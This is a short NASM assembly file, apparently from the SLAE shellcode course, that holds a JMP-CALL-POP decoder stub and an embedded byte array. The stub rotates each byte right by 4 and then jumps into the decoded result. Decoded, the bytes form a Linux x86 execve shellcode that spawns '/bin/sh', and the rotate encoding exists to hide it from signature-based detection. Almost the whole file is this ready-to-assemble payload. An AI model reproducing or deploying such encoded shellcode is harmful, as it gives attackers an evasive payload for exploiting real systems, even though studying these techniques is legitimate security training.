; Filename: decode-ror.nasm
; Author: Gitsnik SLAE-431
; Website:  http://dracyrys.com/
;
; Purpose:
;	Provide two way ror encoding of shellcode bytes.
;
; Strictly speaking, this is both the encoder and decoder
; stubs. For the sake of cleanliness I have removed the
; encoder "features" as defined in encode-ror.nasm
;

global _start
section .text
_start:
	jmp short caller

decoder:
	pop esi
	lea edi, [esi]
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov cl, codelen

decode:
	mov bl, byte [esi + eax]
	ror bl, 4
	mov byte [edi], bl

	inc edi
	inc eax

	dec ecx
	jnz decode

	jmp short shellcode

caller:
	call decoder

	shellcode: db 0x13,0x9c,0x7f,0x1e,0x05,0x86,0xe6,0xf2,0x37,0x86,0x86,0xf2,0xf2,0x26,0x96,0x98,0x3e,0x0b,0xb0,0xdc,0x08
	codelen equ $-shellcode
